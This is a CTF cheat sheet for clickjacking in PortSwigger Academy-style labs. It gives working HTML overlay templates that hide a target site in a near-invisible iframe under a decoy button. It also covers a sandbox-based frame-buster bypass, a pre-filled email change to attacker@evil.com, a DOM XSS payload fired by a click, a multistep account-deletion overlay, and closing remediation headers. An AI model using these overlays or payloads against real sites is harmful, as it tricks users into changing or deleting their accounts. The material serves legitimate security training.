# Clickjacking (UI Redressing) — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, browser DevTools, Exploit Server  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

1. **Check Frameability:** Send request to Repeater, inspect response headers for defenses:
   - `X-Frame-Options: DENY` or `SAMEORIGIN`
   - `Content-Security-Policy: frame-ancestors 'none'` or `'self'`
2. **Find Target Action:** Locate state-changing, one-click or prefillable actions (e.g., `/my-account/change-email`, `/my-account/delete`, `/feedback`).
3. **Map Coordinates:** In DevTools, measure target button size and position relative to page margins.
4. **Build Overlay:** Frame target site in an invisible `<iframe>` (`opacity: 0.0001` or `0.05` while aligning). Place decoy button or text directly under the victim's cursor.
5. **Bypass Frame Busters:** If JavaScript frame busters exist, restrict iframe permissions via `sandbox="allow-forms"`.
6. **Deliver Exploit:** Deliver via Exploit Server and entice the victim to click.

---

## 2. Basic Clickjacking Overlay Template

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001; /* Set to 0.2 during alignment */
        z-index: 2;
    }
    .decoy {
        position: absolute;
        top: 310px;    /* Adjust until decoy aligns over target button */
        left: 80px;   /* Adjust until decoy aligns over target button */
        z-index: 1;
        width: 120px;
        height: 40px;
        background: #007bff;
        color: white;
        text-align: center;
        line-height: 40px;
        font-family: sans-serif;
        cursor: pointer;
    }
</style>
<div class="decoy">Click Me!</div>
<iframe src="https://TARGET.net/my-account"></iframe>
```

---

## 3. Academy Attack Scenarios & Bypasses

### 1. Pre-Filled Form Inputs via URL Parameters
- **Flaw:** Target form accepts input via GET parameters (e.g. `?email=attacker@evil.com`).
- **Exploitation:**
  ```html
  <iframe src="https://TARGET.net/my-account?email=attacker@evil.com"></iframe>
  ```
  Align the decoy button over the "Update email" button. A single click submits the pre-filled email.

---

### 2. Frame Buster Script Bypass via HTML5 Sandbox
- **Defensive script in target:**
  ```javascript
  if (top.location != self.location) {
      top.location = self.location;
  }
  ```
- **Bypass:** The `sandbox` attribute restricts the framed document's capabilities. Setting `sandbox="allow-forms"` permits form submission while blocking `allow-top-navigation`, effectively disarming the buster script:
  ```html
  <iframe sandbox="allow-forms" src="https://TARGET.net/my-account"></iframe>
  ```
  *(If the target requires client-side scripts to function, use `sandbox="allow-forms allow-scripts"`—modern browsers still block top navigation if `allow-top-navigation` is omitted).*

---

### 3. Clickjacking Triggering DOM-Based XSS
- **Scenario:** The target page contains a DOM XSS vulnerability that requires user interaction (e.g., clicking a submit button on `/feedback`).
- **Exploitation:**
  1. Pass the XSS payload through URL parameters:
     ```html
     <iframe src="https://TARGET.net/feedback?name=<img src=1 onerror=print()>&email=test@test.com&subject=test&message=test"></iframe>
     ```
  2. Align the decoy click on the "Submit feedback" button. Clicking triggers form submission and executes the reflected DOM payload.

---

### 4. Multistep Clickjacking
- **Scenario:** The target requires two distinct clicks (e.g., "Delete account" followed by a confirmation modal "Yes, delete").
- **Exploitation:** Create two decoy elements shown sequentially:
  ```html
  <style>
      iframe {
          position: relative;
          width: 800px;
          height: 600px;
          opacity: 0.0001;
          z-index: 2;
      }
      .step1, .step2 {
          position: absolute;
          z-index: 1;
      }
      .step1 { top: 400px; left: 100px; }
      .step2 { top: 450px; left: 250px; display: none; }
  </style>
  <div class="step1" onclick="showStep2()">Step 1: Click Here</div>
  <div class="step2">Step 2: Confirm</div>
  <iframe src="https://TARGET.net/my-account"></iframe>
  <script>
      function showStep2() {
          document.querySelector('.step1').style.display = 'none';
          document.querySelector('.step2').style.display = 'block';
      }
  </script>
  ```

---

## 4. Troubleshooting & Alignment Workflow

1. **Visual Alignment:** Set iframe `opacity: 0.3` or `opacity: 0.5` on the exploit server so the target application and your decoy are both visible simultaneously.
2. **Scroll Offset:** If the target button is below the fold, wrap the iframe in a container with negative margins or use `scrollTop`:
   ```html
   <div style="position: absolute; top: -200px; left: -50px;">
       <iframe src="https://TARGET.net/my-account"></iframe>
   </div>
   ```
3. **Verify Click Registration:** Check DevTools network tab to ensure clicks actually strike the iframe and trigger the state change.
4. **Final Delivery:** Switch `opacity` to `0.0001` before delivering to victim.

---

## 5. CTF Quick Reference

| Defense Encountered | Vulnerability / Bypass | Exploit Mechanism |
|---|---|---|
| **No headers present** | Frameable anywhere | Standard overlay with transparent `<iframe>` |
| **JS Frame Buster** | `top.location = self.location` | Add `sandbox="allow-forms"` to `<iframe>` |
| **Prefilled parameters** | Accepts input via GET | Set target URL with query params (`?email=...`) |
| **Two-factor / Confirm** | Multiple sequential clicks | Multi-layer decoy elements toggled on click |
| **X-Frame-Options: DENY** | Unframeable | Clickjacking not possible; look for CORS / CSRF |
| **CSP frame-ancestors** | Restricted origins | Cannot frame unless allowed origin is compromised |

---

## 6. Remediation

- **Content-Security-Policy (CSP):**
  ```http
  Content-Security-Policy: frame-ancestors 'none';
  ```
  *(Recommended; supersedes `X-Frame-Options` and allows specific whitelisting).*
- **X-Frame-Options:**
  ```http
  X-Frame-Options: DENY
  ```
  *(Legacy header; use `DENY` or `SAMEORIGIN`).*
